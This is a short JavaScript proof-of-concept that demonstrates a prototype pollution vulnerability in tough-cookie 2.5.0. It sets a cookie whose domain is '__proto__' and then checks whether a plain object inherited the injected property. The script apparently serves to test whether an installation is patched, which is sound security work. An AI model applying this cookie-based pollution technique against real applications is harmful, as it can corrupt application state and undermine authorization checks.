'use strict';

/**
 * This script demonstrates a prototype pollution vulnerability in tough-cookie 2.5.0.
 * Prototype pollution occurs when a JavaScript object’s prototype is modified.
 * 
 * In this case, by setting a cookie with the domain "__proto__", we are attempting to
 * modify Object.prototype. If successful, this allows attackers to inject properties
 * into all JavaScript objects, which can lead to serious security issues.
 * 
 * If the vulnerability exists, the prototype of `Object.prototype` will be polluted,
 * and the script will print "EXPLOIT SUCCESSFUL".
 * 
 * If the patched version of tough-cookie is installed, the vulnerability will be mitigated,
 * and the script will print "EXPLOIT FAILED".
 */

const tough = require('tough-cookie');

const jar = new tough.CookieJar(undefined, {
  rejectPublicSuffixes: false
});

jar.setCookieSync('Slonser=polluted; Domain=__proto__; Path=/notauth', 'https://__proto__/admin');
jar.setCookieSync('Auth=Lol; Domain=google.com; Path=/notauth', 'https://google.com/');

const pollutedObject = {};

if (pollutedObject["/notauth"] === undefined) {
  console.log('EXPLOIT FAILED');
} else {
  console.log('EXPLOIT SUCCESSFUL');
}